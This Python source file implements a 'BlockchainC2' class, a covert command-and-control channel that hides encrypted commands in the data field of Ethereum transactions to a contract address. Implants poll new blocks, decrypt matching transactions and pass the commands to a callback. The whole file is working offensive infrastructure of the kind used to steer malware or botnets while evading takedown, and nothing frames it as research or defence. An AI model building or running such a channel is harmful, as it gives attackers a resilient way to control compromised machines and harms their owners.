import os
import json
import time
import logging
from typing import Optional, Dict, Any
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_account import Account
from eth_account.messages import encode_defunct

from core.crypto_agility_manager import CryptoAgilityManager
from core.security_shield import SecurityShield

logger = logging.getLogger(__name__)

class BlockchainC2:
    """
    Blockchain-based command and control channel.
    Uses Ethereum-compatible blockchain to embed encrypted commands in transactions.
    """
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.node_url = config.get('node_url', os.environ.get('BLOCKCHAIN_NODE_URL', 'https://mainnet.infura.io/v3/YOUR_KEY'))
        self.contract_address = config.get('contract_address', os.environ.get('CONTRACT_ADDRESS'))
        self.private_key = config.get('private_key', os.environ.get('WALLET_PRIVATE_KEY'))
        self.chain_id = config.get('chain_id', 1)  # Ethereum mainnet default
        self.gas_limit = config.get('gas_limit', 200000)
        self.gas_price = config.get('gas_price', None)  # auto if None
        self.poll_interval = config.get('poll_interval', 60)
        self.last_block = 0

        self.w3 = None
        self.account = None
        self.crypto = CryptoAgilityManager(
            master_secret=os.environ.get('MASTER_SECRET_B64'),
            salt=os.environ.get('SALT')
        )
        self.shield = SecurityShield(os.environ.get('MASTER_SECRET_B64'), os.environ.get('SALT'))
        self._connect()

    def _connect(self):
        """Initialize web3 connection and account."""
        try:
            self.w3 = Web3(Web3.HTTPProvider(self.node_url))
            # Inject PoA middleware for networks like Polygon, BSC
            if self.chain_id in [137, 56]:
                self.w3.middleware_onion.inject(geth_poa_middleware, layer=0)
            if not self.w3.is_connected():
                raise ConnectionError("Failed to connect to blockchain node")
            logger.info(f"Connected to blockchain node. Chain ID: {self.w3.eth.chain_id}")

            if self.private_key:
                self.account = Account.from_key(self.private_key)
                logger.info(f"Account loaded: {self.account.address}")
            else:
                logger.warning("No private key provided, read-only mode")
        except Exception as e:
            logger.error(f"Blockchain connection error: {e}")
            self.w3 = None
            self.account = None

    def _encrypt_command(self, command: Dict[str, Any]) -> bytes:
        """Encrypt command using crypto agility manager."""
        cmd_json = json.dumps(command).encode()
        return self.crypto.encrypt(cmd_json, aad=b"blockchain_c2")

    def _decrypt_command(self, encrypted: bytes) -> Dict[str, Any]:
        """Decrypt command using crypto agility manager."""
        decrypted = self.crypto.decrypt(encrypted)
        return json.loads(decrypted.decode())

    def send_command(self, command: Dict[str, Any]) -> Optional[str]:
        """
        Embed an encrypted command into a blockchain transaction.
        Returns transaction hash if successful, None otherwise.
        """
        if not self.w3 or not self.account:
            logger.error("Web3 or account not available")
            return None

        try:
            encrypted_cmd = self._encrypt_command(command)
            # Prepare transaction
            nonce = self.w3.eth.get_transaction_count(self.account.address)
            gas_price = self.gas_price if self.gas_price else self.w3.eth.gas_price

            tx = {
                'to': self.contract_address,
                'value': 0,
                'gas': self.gas_limit,
                'gasPrice': gas_price,
                'nonce': nonce,
                'data': encrypted_cmd.hex(),
                'chainId': self.chain_id
            }
            signed_tx = self.account.sign_transaction(tx)
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            logger.info(f"Command sent, tx: {tx_hash.hex()}")
            return tx_hash.hex()
        except Exception as e:
            logger.error(f"Failed to send command: {e}")
            return None

    def listen_for_commands(self, from_block: int = None, to_block: int = None) -> list:
        """
        Scan blockchain for transactions sent to the contract address,
        decrypt and return any valid commands.
        """
        if not self.w3:
            logger.error("Web3 not available")
            return []

        if from_block is None:
            if self.last_block == 0:
                self.last_block = self.w3.eth.block_number - 1000  # start from recent blocks
            from_block = self.last_block + 1
        if to_block is None:
            to_block = self.w3.eth.block_number

        commands = []
        for bn in range(from_block, to_block + 1):
            try:
                block = self.w3.eth.get_block(bn, full_transactions=True)
                for tx in block.transactions:
                    # Check if transaction is to our contract
                    if tx['to'] and tx['to'].lower() == self.contract_address.lower():
                        if tx['input'] and tx['input'] != '0x':
                            raw = bytes.fromhex(tx['input'][2:])
                            try:
                                cmd = self._decrypt_command(raw)
                                cmd['tx_hash'] = tx['hash'].hex()
                                cmd['block'] = bn
                                commands.append(cmd)
                                logger.info(f"Received command from block {bn}, tx: {tx['hash'].hex()}")
                            except Exception as e:
                                logger.debug(f"Failed to decrypt tx {tx['hash'].hex()}: {e}")
            except Exception as e:
                logger.error(f"Error scanning block {bn}: {e}")
        self.last_block = to_block
        return commands

    def start_monitoring(self, callback=None):
        """
        Continuously monitor the blockchain for new commands.
        Calls callback for each received command.
        """
        if not self.w3:
            logger.error("Cannot start monitoring: Web3 not available")
            return

        while True:
            try:
                latest = self.w3.eth.block_number
                if latest > self.last_block:
                    cmds = self.listen_for_commands(self.last_block + 1, latest)
                    for cmd in cmds:
                        if callback:
                            callback(cmd)
                        else:
                            logger.info(f"Command received: {cmd}")
                time.sleep(self.poll_interval)
            except Exception as e:
                logger.error(f"Monitoring loop error: {e}")
                time.sleep(self.poll_interval * 2)

    def get_balance(self, address: str = None) -> Optional[int]:
        """Get balance of an address (or the loaded account)."""
        if not self.w3:
            return None
        addr = address if address else self.account.address if self.account else None
        if not addr:
            return None
        try:
            return self.w3.eth.get_balance(addr)
        except Exception as e:
            logger.error(f"Failed to get balance: {e}")
            return None

    def is_connected(self) -> bool:
        return self.w3 is not None and self.w3.is_connected()